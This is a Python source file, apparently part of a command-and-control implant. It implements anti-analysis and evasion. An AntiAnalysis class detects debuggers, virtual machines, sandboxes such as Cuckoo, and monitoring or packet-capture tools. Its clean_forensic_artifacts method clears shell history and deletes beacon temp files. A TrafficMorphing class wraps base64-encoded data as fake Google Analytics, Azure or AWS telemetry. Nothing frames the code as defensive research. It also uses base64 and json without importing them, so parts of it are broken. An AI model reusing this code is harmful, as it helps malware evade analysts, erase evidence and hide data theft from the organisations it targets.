#!/usr/bin/env python3
"""
Advanced anti-analysis and evasion techniques
"""
import os
import sys
import platform
import time
import random
import asyncio
import psutil
from typing import List, Dict, Any
import hashlib

class AntiAnalysis:
    """Comprehensive anti-analysis and detection evasion"""
    
    def __init__(self):
        self.analysis_indicators = self._load_analysis_indicators()
        self.last_cleanup = time.time()
    
    def _load_analysis_indicators(self) -> Dict[str, List[str]]:
        """Load analysis environment indicators"""
        return {
            'process_names': [
                'ollydbg', 'x32dbg', 'x64dbg', 'ida64', 'wireshark',
                'procmon', 'processhacker', 'vboxservice', 'vmwaretray'
            ],
            'window_titles': [
                'ollydbg', 'ida -', 'wireshark', 'process monitor',
                'immunity debugger', 'windbg'
            ],
            'filesystem_paths': [
                'C:\\Tools\\x64dbg', 'C:\\Program Files\\IDA',
                'C:\\Program Files\\Wireshark', 'C:\\Sandbox',
                'C:\\Analysis', '/opt/x64dbg', '/usr/bin/ltrace'
            ],
            'registry_keys': [
                'HARDWARE\\ACPI\\DSDT\\VBOX__',
                'SYSTEM\\CurrentControlSet\\Services\\VBoxGuest',
                'SYSTEM\\CurrentControlSet\\Services\\VMwareTools'
            ]
        }
    
    def check_debugger(self) -> bool:
        """Check for debugger presence"""
        checks = [
            self._check_debugger_windows(),
            self._check_debugger_linux(),
            self._check_debugger_macos(),
            self._check_process_debugger()
        ]
        
        return not any(checks)
    
    def _check_debugger_windows(self) -> bool:
        """Windows-specific debugger checks"""
        if platform.system() != "Windows":
            return False
            
        try:
            import ctypes
            from ctypes import wintypes
            
            # IsDebuggerPresent API
            kernel32 = ctypes.windll.kernel32
            if kernel32.IsDebuggerPresent():
                return True
            
            # Check remote debugger
            process_debug_flags = 0x1F
            if kernel32.CheckRemoteDebuggerPresent(kernel32.GetCurrentProcess(), 
                                                 ctypes.byref(wintypes.DWORD())):
                return True
            
            # NtQueryInformationProcess
            ntdll = ctypes.windll.ntdll
            process_debug_port = 0x7
            debug_port = wintypes.DWORD()
            status = ntdll.NtQueryInformationProcess(
                kernel32.GetCurrentProcess(),
                process_debug_port,
                ctypes.byref(debug_port),
                ctypes.sizeof(debug_port),
                None
            )
            
            if status == 0 and debug_port.value != 0:
                return True
                
        except Exception:
            pass
            
        return False
    
    def _check_debugger_linux(self) -> bool:
        """Linux-specific debugger checks"""
        if platform.system() != "Linux":
            return False
            
        try:
            # Check TracerPid in /proc/self/status
            with open('/proc/self/status', 'r') as f:
                status_content = f.read()
                for line in status_content.split('\n'):
                    if line.startswith('TracerPid:'):
                        tracer_pid = line.split(':')[1].strip()
                        if tracer_pid != '0':
                            return True
            
            # Check parent process
            parent_pid = os.getppid()
            parent_name = self._get_process_name(parent_pid)
            debuggers = ['gdb', 'strace', 'ltrace', 'radare2']
            if any(debugger in parent_name.lower() for debugger in debuggers):
                return True
                
        except Exception:
            pass
            
        return False
    
    def _check_process_debugger(self) -> bool:
        """Check if current process is being debugged"""
        try:
            # Timing check - debuggers slow execution
            start_time = time.perf_counter()
            # Perform some computation
            _ = hashlib.sha256(b"debug_check").hexdigest()
            end_time = time.perf_counter()
            
            if (end_time - start_time) > 0.1:  # Threshold in seconds
                return True
                
        except Exception:
            pass
            
        return False
    
    def check_sandbox(self) -> bool:
        """Check for sandbox/virtualized environment"""
        checks = [
            self._check_virtual_machine(),
            self._check_sandbox_artifacts(),
            self._check_system_resources(),
            self._check_user_interaction()
        ]
        
        # Allow some checks to fail for resilience
        return sum(checks) < 2
    
    def _check_virtual_machine(self) -> bool:
        """Check for VM indicators"""
        vm_indicators = 0
        
        try:
            # Check MAC address
            for interface, addrs in psutil.net_if_addrs().items():
                for addr in addrs:
                    if addr.family == psutil.AF_LINK:
                        mac = addr.address.lower()
                        vm_mac_prefixes = ['00:05:69', '00:0c:29', '00:1c:14', 
                                         '00:50:56', '08:00:27']
                        if any(mac.startswith(prefix) for prefix in vm_mac_prefixes):
                            vm_indicators += 1
            
            # Check hardware
            if platform.system() == "Windows":
                import winreg
                try:
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
                                       "SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum")
                    value, _ = winreg.QueryValueEx(key, "0")
                    if any(vm_indicator in value.lower() for vm_indicator in 
                          ['vbox', 'vmware', 'qemu', 'virtual']):
                        vm_indicators += 1
                except:
                    pass
            
            # Check processes
            vm_processes = ['vboxservice', 'vmwaretray', 'vboxtray', 
                          'prl_tools_service', 'qemu-ga']
            for proc in psutil.process_iter(['name']):
                if proc.info['name'].lower() in vm_processes:
                    vm_indicators += 1
                    
        except Exception:
            pass
            
        return vm_indicators >= 2
    
    def _check_sandbox_artifacts(self) -> bool:
        """Check for sandbox-specific artifacts"""
        sandbox_indicators = 0
        
        try:
            # Check for analysis tools
            analysis_tools = ['procmon', 'wireshark', 'sandbox', 'cuckoo', 
                            'joebox', 'anubis']
            for proc in psutil.process_iter(['name']):
                if any(tool in proc.info['name'].lower() for tool in analysis_tools):
                    sandbox_indicators += 1
            
            # Check file system artifacts
            sandbox_paths = ['C:\\analysis', 'C:\\sandbox', 'C:\\sample',
                           '/opt/cuckoo', '/var/lib/cuckoo']
            for path in sandbox_paths:
                if os.path.exists(path):
                    sandbox_indicators += 1
                    
        except Exception:
            pass
            
        return sandbox_indicators >= 2
    
    def _check_system_resources(self) -> bool:
        """Check system resources for sandbox indicators"""
        try:
            # Sandboxes often have limited resources
            if psutil.cpu_count() < 2:
                return True
            
            memory_gb = psutil.virtual_memory().total / (1024**3)
            if memory_gb < 2.0:
                return True
                
            # Check uptime (sandboxes often have short uptimes)
            if hasattr(psutil, 'boot_time'):
                uptime = time.time() - psutil.boot_time()
                if uptime < 300:  # 5 minutes
                    return True
                    
        except Exception:
            pass
            
        return False
    
    def _check_user_interaction(self) -> bool:
        """Check for lack of user interaction (sandbox indicator)"""
        try:
            if platform.system() == "Windows":
                import ctypes
                from ctypes import wintypes
                
                user32 = ctypes.windll.user32
                
                # Check if user is active
                last_input = wintypes.DWORD()
                user32.GetLastInputInfo(ctypes.byref(last_input))
                idle_time = (ctypes.windll.kernel32.GetTickCount() - last_input.value) / 1000
                
                # Sandboxes often have no user interaction
                if idle_time > 300:  # 5 minutes
                    return True
                    
        except Exception:
            pass
            
        return False
    
    async def check_network_analysis(self) -> bool:
        """Check for network analysis tools"""
        try:
            # Check for packet capture tools
            capture_tools = ['wireshark', 'tcpdump', 'tshark', 'fiddler', 'burp']
            for proc in psutil.process_iter(['name']):
                if any(tool in proc.info['name'].lower() for tool in capture_tools):
                    return True
            
            # Check network interfaces in promiscuous mode
            if platform.system() == "Linux":
                for interface in psutil.net_if_stats():
                    stats = psutil.net_if_stats()[interface]
                    if stats.isup and hasattr(stats, 'flags'):
                        if 'PROMISC' in stats.flags:
                            return True
                            
        except Exception:
            pass
            
        return False
    
    def check_analysis_tools(self) -> bool:
        """Check for analysis and monitoring tools"""
        try:
            suspicious_processes = [
                'procmon', 'processhacker', 'autoruns', 'tcpview',
                'regshot', 'filemon', 'regmon', 'apatedns'
            ]
            
            for proc in psutil.process_iter(['name']):
                proc_name = proc.info['name'].lower()
                if any(suspicious in proc_name for suspicious in suspicious_processes):
                    return True
                    
        except Exception:
            pass
            
        return False
    
    async def clean_forensic_artifacts(self):
        """Clean forensic artifacts from system"""
        try:
            # Clear command history
            if platform.system() == "Windows":
                os.system('cls' if os.name == 'nt' else 'clear')
            else:
                os.system('history -c')
            
            # Clear temporary files
            temp_dirs = [
                os.environ.get('TEMP', ''),
                os.environ.get('TMP', ''),
                '/tmp',
                '/var/tmp'
            ]
            
            for temp_dir in temp_dirs:
                if temp_dir and os.path.exists(temp_dir):
                    try:
                        for file in os.listdir(temp_dir):
                            if file.startswith('beacon_') or file.endswith('.tmp'):
                                file_path = os.path.join(temp_dir, file)
                                try:
                                    os.remove(file_path)
                                except:
                                    pass
                    except:
                        pass
            
            self.last_cleanup = time.time()
            
        except Exception as e:
            print(f"Forensic cleanup failed: {e}")
    
    def _get_process_name(self, pid: int) -> str:
        """Get process name cross-platform"""
        try:
            proc = psutil.Process(pid)
            return proc.name()
        except:
            return "unknown"

class TrafficMorphing:
    """Traffic morphing and protocol imitation"""
    
    def __init__(self):
        self.profiles = self._load_traffic_profiles()
    
    def _load_traffic_profiles(self) -> Dict[str, Dict]:
        """Load traffic morphing profiles"""
        return {
            'google_analytics': {
                'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'endpoints': ['/collect', '/analytics.js', '/gtag/js'],
                'headers': {
                    'Accept': 'image/webp,image/apng,image/*,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Cache-Control': 'no-cache',
                    'Connection': 'keep-alive',
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                'methods': ['GET', 'POST']
            },
            'azure_monitor': {
                'user_agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
                'endpoints': ['/api/v1/telemetry', '/v1/metrics', '/data'],
                'headers': {
                    'Accept': 'application/json',
                    'Content-Type': 'application/json',
                    'User-Agent': 'AzureMonitor/1.0'
                },
                'methods': ['POST']
            },
            'aws_cloudwatch': {
                'user_agent': 'aws-cloudwatch-metric-agent/1.0',
                'endpoints': ['/v1/metrics', '/monitoring/data', '/2010-08-01/metrics'],
                'headers': {
                    'Content-Type': 'application/x-amz-json-1.1',
                    'User-Agent': 'aws-cli/2.0.0'
                },
                'methods': ['POST']
            }
        }
    
    async def initialize(self, profile_name: str):
        """Initialize traffic morphing with specified profile"""
        self.current_profile = self.profiles.get(profile_name, self.profiles['google_analytics'])
    
    async def morph_request(self, data: bytes, profile_name: str) -> Dict[str, Any]:
        """Morph request to match traffic profile"""
        profile = self.profiles.get(profile_name, self.profiles['google_analytics'])
        
        # Encode data to match profile
        if profile_name == 'google_analytics':
            encoded_data = base64.b64encode(data).decode()
            morphed_body = f"v=1&tid=UA-12345678-1&cid={random.randint(100000,999999)}&t=pageview&dp=%2F&dt=Home&z={encoded_data}"
        elif profile_name in ['azure_monitor', 'aws_cloudwatch']:
            morphed_body = json.dumps({
                'metrics': [
                    {
                        'name': 'cpu_usage',
                        'value': random.uniform(0, 100),
                        'timestamp': int(time.time()),
                        'data': base64.b64encode(data).decode()
                    }
                ]
            })
        else:
            morphed_body = data
        
        # Select random endpoint from profile
        endpoint = random.choice(profile['endpoints'])
        
        return {
            'method': random.choice(profile['methods']),
            'url': f"https://example.com{endpoint}",
            'headers': profile['headers'],
            'body': morphed_body
        }